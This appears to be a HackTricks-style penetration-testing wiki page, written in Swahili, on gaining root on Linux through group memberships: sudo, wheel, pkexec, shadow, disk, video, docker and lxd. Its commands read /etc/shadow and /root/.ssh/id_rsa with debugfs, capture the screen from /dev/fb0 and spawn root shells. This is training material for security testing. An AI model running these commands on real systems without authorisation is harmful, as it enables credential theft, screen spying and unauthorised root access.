{{#include ../../banners/hacktricks-training.md}}

# Sudo/Admin Groups

## **PE - Method 1**

**Wakati mwingine**, **kwa kawaida \(au kwa sababu programu fulani inahitaji hivyo\)** ndani ya faili **/etc/sudoers** unaweza kupata baadhi ya mistari hii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwa kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
```text
sudo su
```
## PE - Method 2

Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa unapata kwamba binary pkexec ni binary ya SUID na unategemea sudo au admin, huenda unaweza kutekeleza binaries kama sudo ukitumia pkexec. Angalia maudhui ya:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa default** katika baadhi ya linux vinaweza **kuonekana** baadhi ya vikundi **sudo au admin**.

Ili **kuwa root unaweza kutekeleza**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ikiwa unajaribu kutekeleza **pkexec** na unapata **makosa** haya:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sehemu 2 tofauti za ssh**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**Wakati mwingine**, **kwa kawaida** ndani ya **/etc/sudoers** faili unaweza kupata mstari huu:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwa kundi la wheel anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
```text
sudo su
```
# Shadow Group

Watumiaji kutoka **group shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Hivyo, soma faili na jaribu **kufungua baadhi ya hash**.

# Kundi la Disk

Hii haki ni karibu **sawa na ufikiaji wa root** kwani unaweza kufikia data zote ndani ya mashine.

Faili:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Hata hivyo, ukijaribu **kuandika faili zinazomilikiwa na root** \(kama `/etc/shadow` au `/etc/passwd`\) utapata kosa la "**Permission denied**".

# Video Group

Kwa kutumia amri `w` unaweza kupata **nani aliyeingia kwenye mfumo** na itaonyesha matokeo kama ifuatavyo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** inamaanisha kwamba mtumiaji **yossi amejiandikisha kimwili** kwenye terminal kwenye mashine.

Kikundi cha **video** kina ufikiaji wa kuangalia matokeo ya skrini. Kimsingi unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** katika data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuhifadhiwa katika `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ili **kufungua** **picha halisi** unaweza kutumia **GIMP**, chagua faili **`screen.raw`** na chagua kama aina ya faili **Data ya picha halisi**:

![](../../images/image%20%28208%29.png)

Kisha badilisha Upana na Kimo kuwa zile zinazotumika kwenye skrini na angalia aina tofauti za Picha \(na uchague ile inayoonyesha vizuri skrini\):

![](../../images/image%20%28295%29.png)

# Kundi la Root

Inaonekana kama kwa kawaida **wanachama wa kundi la root** wanaweza kuwa na ufikiaji wa **kubadilisha** baadhi ya **faili za usanidi** wa **huduma** au baadhi ya **faili za maktaba** au **mambo mengine ya kuvutia** ambayo yanaweza kutumika kuongeza mamlaka...

**Angalia ni faili zipi wanachama wa root wanaweza kubadilisha**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Kundi la Docker

Unaweza kuunganisha mfumo wa faili wa mwenyeji kwenye kiasi cha mfano, hivyo wakati mfano unapoanza, mara moja inachaji `chroot` kwenye kiasi hicho. Hii inakupa kwa ufanisi root kwenye mashine.

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

# Kundi la lxc/lxd

[lxc - Kuinua Haki](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
